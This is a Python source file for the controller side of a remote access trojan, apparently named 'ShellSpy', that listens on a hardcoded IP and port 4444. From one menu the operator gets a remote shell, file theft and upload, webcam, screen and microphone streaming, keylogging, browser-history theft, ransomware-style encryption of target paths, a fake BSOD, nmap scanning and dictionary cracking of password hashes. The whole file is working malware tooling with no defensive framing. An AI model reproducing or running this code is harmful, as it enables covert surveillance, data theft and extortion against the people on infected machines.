import socket
import os
import datetime
import time
import numpy as np
import cv2
import pickle
import struct
import nmap
import ssl
import ntpath
import crypt
from colorama import Fore
import threading
import pyaudio

Host = "100.94.242.9" #100.94.241.129
Port = 4444
Buff = 1024
connected_address = []
server_socket = None
desktop_name = None
operating_system = None
mac_address = None
ip_address = None
user_name = None



def CreateSocket():
    global server_socket
    try:
        plain_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        plain_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        # Create an SSL context
        context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        context.load_cert_chain(certfile='server.crt', keyfile='server.key')

        # Wrap the plain socket with SSL
        server_socket = context.wrap_socket(plain_socket, server_side=True)
        print("Secure socket created successfully")

    except socket.error as msg:
        print("Error code:" + str(msg))


def BindSocket():
    global server_socket
    try:
        print("Binding to " + Host + ":" + str(Port))
        server_socket.bind((Host, Port))
        print("Binding complete")
        server_socket.listen(5)  # Listen for only one connection
        print("Listening on port: " + str(Port))
    except socket.error as msg:
        print("Error code:" + str(msg))


def AcceptConnection():
    global connected_socket, connected_address
    try:
        conn, addr = server_socket.accept()
        # conn.setblocking(1)
        print(f'Connected by {addr}' + '\n')
        connected_address = addr
        connected_socket = conn
    except socket.error as msg:
        print("Error code:" + str(msg))


def ListConnection():
    global connected_address, desktop_name, operating_system, mac_address, ip_address, user_name, processor
    print("     Connected Client:")
    print("  ------------------------")
    try:
        print(f"  Local IP Address:    {connected_address[0]}")
        print(f"  Port:                {connected_address[1]}")
        print(f"  Desktop Name:        {desktop_name}")
        print(f"  Operating System:    {operating_system}")
        print(f"  MAC Address:         {mac_address}")
        print(f"  User Name:           {user_name}")
        print(f"  Public IP Address:   {ip_address}")
    except socket.error as msg:
        print("  Error receiving info:", msg)


def receive_info(connected_socket):
    global desktop_name, operating_system, mac_address, ip_address, user_name, system_architecture, processor
    try:
        info = connected_socket.recv(Buff).decode("utf-8")
        data = info.split(',')
        if len(data) == 5:
            desktop_name, operating_system, mac_address, ip_address, user_name = data
        else:
            print("Invalid data format received from client.")
    except Exception as e:
        print("Error receiving info:", e)


def receive_file(filename, connected_socket):
    try:
        save_directory = "/Users/anouar/TROJAN/DATA"

        # Receive the initial control message
        file_msg = connected_socket.recv(Buff).decode("utf-8")
        if file_msg == "yes":
            # Receive file size using struct
            size_bytes = connected_socket.recv(4)
            file_size = struct.unpack(">L", size_bytes)[0]
            full_path = os.path.join(save_directory, filename)
            received_size = 0  # Initialize received_size to track received data
            with open(full_path, "wb") as file:
                while received_size < file_size:
                    data = connected_socket.recv(Buff)
                    if not data:
                        break
                    file.write(data)
                    received_size += len(data)  # Update received_size
            print(f"File '{filename}' received successfully. Total bytes received: {received_size}")
        else:
            print("Error: File does not exist.")
    except Exception as e:
        print("Error receiving file:", e)


def send_file(filename):
    global connected_socket
    file_size = os.path.getsize(filename)
    connected_socket.send(struct.pack(">L", file_size))
    time.sleep(1)
    try:
        with open(filename, "rb") as file:
            while True:
                data = file.read(Buff)
                if not data:
                    break
                connected_socket.sendall(data)
    except Exception as e:
        print("Error sending file:", e)


def RunCommand():
    global connected_socket
    while True:
        try:
            path()
            #if connected_socket.fileno() == -1:
                #print("Client disconnected.")
                #break
            command = input()
            connected_socket.send(command.encode("utf-8"))
            if command.lower() == 'q':
                break
            output = connected_socket.recv(4096).decode("utf-8")
            print(output)
        except BrokenPipeError:
            print("Client connection closed unexpectedly.")
            break
        except socket.error as msg:
            print("Error executing command:", msg)


def path():
    global connected_socket
    command = "cd"
    connected_socket.send(command.encode("utf-8"))
    current_path = connected_socket.recv(Buff).decode("utf-8")
    print(f"{current_path}> ", end="")  # Print the current directory path with a space after it"""


def start_cam_stream(webcam_connection):
    data = b""
    payload_size = struct.calcsize(">L")

    while True:
        while len(data) < payload_size:
            data += webcam_connection.recv(1024)
        packed_msg_size = data[:payload_size]
        data = data[payload_size:]

        msg_size = struct.unpack(">L", packed_msg_size)[0]
        while len(data) < msg_size:
            data += webcam_connection.recv(1024)
        frame_data = data[:msg_size]
        data = data[msg_size:]

        frame = pickle.loads(frame_data, fix_imports=True, encoding="latin1")
        frame = cv2.imdecode(frame, cv2.IMREAD_COLOR)

        cv2.imshow('ImageWindow', frame)
        key = cv2.waitKey(1) & 0xFF
        if key == ord('q'):
            webcam_connection.send("stop".encode("utf-8"))
            cv2.destroyAllWindows()
            break
    webcam_connection.close()


screen_share = False


def start_screen_share(screen_share_connection):
    while True:
        try:
            size_bytes = screen_share_connection.recv(4)
            size = struct.unpack(">L", size_bytes)[0]
            frame_data = b""
            while len(frame_data) < size:
                frame_data += screen_share_connection.recv(4096)
            frame_array = np.frombuffer(frame_data, dtype=np.uint8)
            frame = cv2.imdecode(frame_array, cv2.IMREAD_COLOR)
            cv2.imshow('Screen Share', frame)
            if cv2.waitKey(1) & 0xFF == ord('q'):
                break
        except Exception as e:
            print("Error:", e)
            break
    cv2.destroyAllWindows()
    screen_share_connection.close()


def scan(target):
    scanner = nmap.PortScanner()
    scanner.scan(target, arguments='-Pn -sV')

    for host in scanner.all_hosts():
        print('----------------------------------------------------')
        print('Host : %s (%s)' % (host, scanner[host].hostname()))
        print('State : %s' % scanner[host].state())

        for proto in scanner[host].all_protocols():
            print('----------')
            print('Protocol : %s' % proto)

            ports = scanner[host][proto].keys()
            for port in ports:
                state = scanner[host][proto][port]['state']
                service = scanner[host][proto][port]['name']
                version = scanner[host][proto][port]['version']
                print('Port : %s\tState : %s\tService : %s\tVersion : %s' % (port, state, service, version))


def cryptCrack(file):
    try:
        passwordFile = open(file, 'r')
    except FileNotFoundError:
        print('[-] File Not Found')
        return

    for line in passwordFile:
        username, password = line.strip().split(':')
        salt = password[:2]
        dictionary = open('crypt_dictionnary.txt', 'r')

        for word in dictionary:
            word = word.strip('\n')
            cryptPassword = crypt.crypt(word, salt)

            if password == cryptPassword:
                print(Fore.GREEN + '[+] Found Password\t\t\t' + username + ' : ' + word)
                print(Fore.RESET)  # Reset color to default
                break
        else:
            print(Fore.RED + '[-] Unable to Crack Password For:\t' + username)
            print(Fore.RESET)  # Reset color to default

        dictionary.close()
    passwordFile.close()

audio_record = False


def receive_audio_stream(client_socket):
    global audio_record
    p = pyaudio.PyAudio()
    stream = p.open(format=pyaudio.paInt16,
                    channels=2,
                    rate=44100,
                    output=True,
                    frames_per_buffer=1024)

    try:
        while audio_record:
            data = client_socket.recv(1024)
            if not data:
                break
            stream.write(data)
    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        print("Stopping audio stream...")
        stream.stop_stream()
        stream.close()
        p.terminate()


def help_command():
    print("""
Available commands:

Connection Management:
  list             - List available connection
  exit             - Terminate the program and close connection

File Operations:
  download         - Download a file from the target machine
  upload           - Upload a file to the target machine
  encrypt          - Encrypt files on the target machine
  decrypt          - Decrypt files on the target machine

System Control:
  cmd              - Open a command shell on the target machine
  lock_screen      - Lock the screen of the target machine
  taskkill         - Kill a process on the target machine
                     (usage: 'taskkill')
  portscanner      - Scan open ports on target machine

Monitoring and Surveillance:
  webcam           - Initiate webcam streaming from the target machine
  voice_record     - Start or stop voice recording on the target machine
                     (usage: 'voice_record --start' or 'voice_record --stop')
  screenshot       - Capture a screenshot from the target machine
  keylogger        - Start or stop keylogging on the target machine
                     (usage: 'keylogger --start' or 'keylogger --stop')
  screen_record    - Start or stop screen recording on the target machine
                     (usage: 'screen_record --start' or 'screen_record --stop')
  screenshare      - Start screen sharing from the target machine
  browser_history  - Retrieve browser history from the target machine
                     (usage: 'browser_history')

Communication:
  send_message     - Send a message to the target machine
  speech           - Run a speech on the target machine


System Settings:
  volume           - Adjust system volume on the target machine
                     (usage: 'volume -u' to set to 100% or 'volume -d' to set to 0%')
  disable          - Disable mouse input on the target machine
                     (usage: 'disable --mouse')
  enable           - Enable mouse input on the target machine
                     (usage: 'enable --mouse')
  keyboard         - Set keyboard layout on the target machine
                     (usage: 'keyboard --ru-RU', 'keyboard --ar-SA', 'keyboard --fr-FR', 'keyboard --en-US')
  wallpaper        - Set wallpaper on the target machine
                     (usage: 'wallpaper')

Utility:
  inloop           - Start or stop a service in a loop on the target machine
                     (usage: 'inloop --start' or 'inloop --stop')
  bruteforce       - Perform a brute force attack on hashed passwords

Miscellaneous:
  !BSod            - Simulate a fake BSOD on the target machine
  help             - Display this help menu
""")


def menu():
    global audio_record
    while True:
        choice = input("\n" + ">>>")
        if choice.lower() != "help":
            connected_socket.send(choice.encode("utf-8"))
        if choice.lower() == "list":
            receive_info(connected_socket)
            ListConnection()
        elif choice.lower() == "download":
            while True:
                # try:
                filename = input("Enter file path to download (or type 'back' to return to menu):")
                connected_socket.send(filename.encode("utf-8"))
                filename = ntpath.basename(filename)
                if filename.lower() == "back":
                    break
                receive_file(filename, connected_socket)

        elif choice.lower() == "upload":
            filename = input("Enter file path to upload : ")
            if os.path.exists(filename):
                connected_socket.send("yes".encode("utf-8"))
                name = os.path.basename(filename)
                connected_socket.send(name.encode("utf-8"))
                send_file(filename)
                print("File sent successfully")

            else:
                connected_socket.send("no".encode("utf-8"))
                print("File does not exist. ")

        elif choice.lower() == "cmd":
            RunCommand()
        elif choice.lower() == "webcam":
            webcam_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            webcam_socket.bind((Host, 9898))
            webcam_socket.listen(1)
            webcam_connection, webcam_address = webcam_socket.accept()
            start_cam_stream(webcam_connection)

        elif choice.lower() == "screenshare":
            screen_share_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            screen_share_socket.bind((Host, 9999))
            screen_share_socket.listen(1)
            screen_share_connection, screen_share_address = screen_share_socket.accept()
            start_screen_share(screen_share_connection)

        elif choice.startswith("voice_record") and choice.endswith("--start"):
            print("[+] Starting voice recording...")
        elif choice.startswith("voice_record") and choice.endswith("--stop"):
            print("[+] Stopping voice recording...")
            filename = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S") + "_audio.wav"
            receive_file(filename, connected_socket)
        elif choice.lower() == "screenshot":
            print("[+] Starting screenshot...")
            current_datetime = datetime.datetime.now()
            filename = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S") + "_ss.png"
            receive_file(filename, connected_socket)
        elif choice.lower() == "lock_screen":
            print("[+] Locking screen...")
        elif choice.lower() == "help":
            help_command()
        elif choice.lower() == "shutdown":
            print("[+] Shutting down ...")
        elif choice.lower() == "portscanner":
            print("[+] Scanning ...")
            ipaddress = connected_address[0]
            scan(ipaddress)
        elif choice.lower() == "send_message":
            text = str(input("Enter the text: "))
            connected_socket.send(text.encode())
            title = str(input("Enter the title: "))
            connected_socket.send(title.encode())
            result_output = connected_socket.recv(1024).decode()
            print(result_output)
        elif choice.startswith("keylogger") and choice.endswith("--start"):
            print("[+] Starting keylogger ...")
        elif choice.startswith("keylogger") and choice.endswith("--stop"):
            print("[+] Stopping keylogger ...")
            current_datetime = datetime.datetime.now()
            filename = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S") + "_keylog.txt"
            receive_file(filename, connected_socket)
        elif choice.startswith("volume") and choice.endswith("-u"):

            print("[+] Volume set to 100%")
        elif choice.startswith("volume") and choice.endswith("-d"):
            print("[+] Volume set to 0%")
        elif choice.startswith("disable") and choice.endswith("--mouse"):
            print("[+] Disabling the mouse...")
        elif choice.startswith("enable") and choice.endswith("--mouse"):
            print("[+] Enabling the mouse...")
        elif choice.startswith("keyboard"):
            if "--" in choice:  # Check if language is specified
                language = choice.split("--")[1]
                if language in ["ru-RU", "ar-SA", "fr-FR", "en-US"]:
                    connected_socket.send(language.encode("utf-8"))
                    print(f"[+] Keyboard layout set to {language}")
                else:
                    print("[!] Invalid keyboard language code.")
            else:
                print("[!] No language specified.")

        elif choice == "encrypt":
            print("Note: Decrypt before encrypting again.")
            while True:
                specific_path = input("Enter the path to encrypt (or type 'back' to exit): ")
                connected_socket.send(specific_path.encode("utf-8"))
                if specific_path.lower() == "back":
                    print("Exiting encryption process.")
                    break
                exist = connected_socket.recv(Buff).decode("utf-8")
                if exist == "exist":
                    print(f"[+] Encrypting {specific_path}")
                    key = connected_socket.recv(1024)
                    print("-------------------KEY BEGIN--------------------")
                    print(key)
                    print("-------------------KEY END-----------------------")
                    break
                else:
                    print("Path does not exist. Please enter a valid path.")

        elif choice == "decrypt":
            print("[+] Decrypting ...")
        elif choice.lower() == "taskkill":
            try:
                pid = int(input("Enter the process id :"))
                print(f"[+] killing process {pid} ...")
                connected_socket.send(str(pid).encode("utf-8"))
                output = connected_socket.recv(4096).decode("utf-8")
                print(output)
            except Exception as e:
                print(connected_socket.recv(1024).decode("utf-8"))
        elif choice.lower() == "speech":
            text = input("Enter a text:")
            connected_socket.send(text.encode("utf-8"))
            print("[+] Text to speach ...")
        elif choice.startswith("screen_record") and choice.endswith("--start"):
            print("[+] Starting screen recording...")
        elif choice.startswith("screen_record") and choice.endswith("--stop"):
            print("[+] Stopping screen recording...")
            filename = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S") + "_video.mp4"
            receive_file(filename, connected_socket)
        elif choice.startswith("inloop") and choice.endswith("--start"):
            result = connected_socket.recv(1024).decode("utf-8")
            print(result)
            service = input("Which service do you want to loop? choose an executable (.exe): ")
            connected_socket.send(service.encode("utf-8"))
            print("[+] Starting...")
        elif choice.startswith("inloop") and choice.endswith("--stop"):
            print("[+] Stopping inloop ...")
        elif choice == "browser_history":
            browser = input("Enter the browser name (chrome, edge, opera): ").lower()
            if browser == "chrome" or browser == "edge" or browser == "opera":
                connected_socket.send(browser.encode("utf-8"))
                filename = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S") + "_" + browser + "_history.txt"
                receive_file(filename, connected_socket)
            else:
                print("[+] Invalid browser")
        elif choice == "wallpaper":
            wallpaper_path = input("Enter the wallpaper path: ")
            send_file(wallpaper_path)
            print("[+] Wallpaper is set...")
        elif choice == "!BSod":
            time = input("Enter the time in seconds for the fake BSOD window to remain open: ")
            try:
                time = int(time)
                connected_socket.send(str(time).encode("utf-8"))
            except ValueError:
                print("Invalid input. Please enter a valid number of seconds.")
        elif choice == "bruteforce":
            file = input("Enter user:pass_hashed file: ")
            cryptCrack(file)
        elif choice == "audiostart":
            print("Listening for audio stream from client...")
            audio_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            audio_socket.bind((Host, 3131))
            audio_socket.listen(1)
            audio_connection, audio_address = audio_socket.accept()
            audio_record = True
            audio_thread = threading.Thread(target=receive_audio_stream, args=(audio_connection,))
            audio_thread.start()
        elif choice == "audiostop":
            audio_record = False
            audio_thread.join()
            audio_connection.close()
        elif choice.lower() == "exit":
            print("[+] Exiting ...")
            connected_socket.close()  # Close the connection with the client
            break  # Exit the menu loop and terminate the program

        else:
            print("Command not found. Type 'help' for a list of commands or 'quit' to exit.")


def main():
    print("""
      █████████  █████               ████  ████   █████████                      
 ███░░░░░███░░███               ░░███ ░░███  ███░░░░░███                     
░███    ░░░  ░███████    ██████  ░███  ░███ ░███    ░░░  ████████  █████ ████
░░█████████  ░███░░███  ███░░███ ░███  ░███ ░░█████████ ░░███░░███░░███ ░███ 
 ░░░░░░░░███ ░███ ░███ ░███████  ░███  ░███  ░░░░░░░░███ ░███ ░███ ░███ ░███ 
 ███    ░███ ░███ ░███ ░███░░░   ░███  ░███  ███    ░███ ░███ ░███ ░███ ░███ 
░░█████████  ████ █████░░██████  █████ █████░░█████████  ░███████  ░░███████ 
 ░░░░░░░░░  ░░░░ ░░░░░  ░░░░░░  ░░░░░ ░░░░░  ░░░░░░░░░   ░███░░░    ░░░░░███ 
                                                         ░███       ███ ░███ 
                                                         █████     ░░██████  
                                                        ░░░░░       ░░░░░░   
    """)
    CreateSocket()
    BindSocket()
    AcceptConnection()  # Accept a single connection

    menu()

    connected_socket.close()


if __name__ == "__main__":
    main()




